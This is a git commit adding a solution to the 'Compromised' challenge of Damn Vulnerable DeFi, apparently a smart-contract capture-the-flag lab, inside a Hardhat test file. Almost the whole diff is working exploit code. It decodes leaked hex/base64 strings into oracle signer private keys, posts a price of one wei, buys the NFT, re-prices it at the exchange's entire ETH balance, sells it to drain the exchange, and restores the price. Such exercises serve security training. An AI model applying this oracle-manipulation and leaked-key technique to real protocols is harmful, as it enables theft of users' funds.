bd7deec05ca79d29566ee83e41fab7befe432e6f
tangliang1 <tlyspa@gmail.com>
2023-10-10 16:17:47 +0800

    chore: challenge7

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,59 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // we've got the oracle price resource control already
+        // the hint located at : https://www.damnvulnerabledefi.xyz/challenges/compromised/
+        
+        // the http response can be convert to private key of the signer
+
+        // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+        // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+    
+        const str1 = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'
+        const str2 = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
+
+        const privateKey1 = Buffer.from(Buffer.from(str1.replace(/\s+/g, ''), 'hex').toString('utf8'), 'base64').toString('utf-8');
+        const privateKey2 = Buffer.from(Buffer.from(str2.replace(/\s+/g, ''), 'hex').toString('utf8'), 'base64').toString('utf-8');
+
+        const signer1 = new ethers.Wallet(privateKey1, ethers.provider);
+        const signer2 = new ethers.Wallet(privateKey2, ethers.provider);
+
+        expect(sources.includes(signer1.address)).to.be.true;
+        expect(sources.includes(signer2.address)).to.be.true;
+
+        const compromisedPrice = ethers.utils.parseUnits('1', 'wei');
+
+        // 1. reset the price of the NFT to 0
+        await oracle.connect(signer1).postPrice('DVNFT', compromisedPrice);
+        await oracle.connect(signer2).postPrice('DVNFT', compromisedPrice);
+
+        // 2. buy the NFT with the compromised account
+        const tx = await exchange.connect(player).buyOne({ value: compromisedPrice });
+
+        // check the nft id from the tx logs
+        const res = await tx.wait();
+        // console.log(res.logs);
+        // console.log(res.logs[0].topics[1]);
+        const nftId = res.logs[0].topics[1];
+
+
+        // check the nft balance of the player
+        expect(await nftToken.balanceOf(player.address)).to.be.eq(1);
+
+        // 2. change the NFT price to the blance of the market
+        const newPrice = await ethers.provider.getBalance(exchange.address);
+        expect(newPrice).to.be.gte(EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(signer1).postPrice('DVNFT', newPrice);
+        await oracle.connect(signer2).postPrice('DVNFT', newPrice);
+
+        // 3. sell the NFT to the market
+        await nftToken.connect(player).approve(exchange.address, nftId);
+        await exchange.connect(player).sellOne(nftId);
+
+        // 4. restore the nft price to the initial price
+        await oracle.connect(signer1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(signer2).postPrice('DVNFT', INITIAL_NFT_PRICE);
     });
 
     after(async function () {
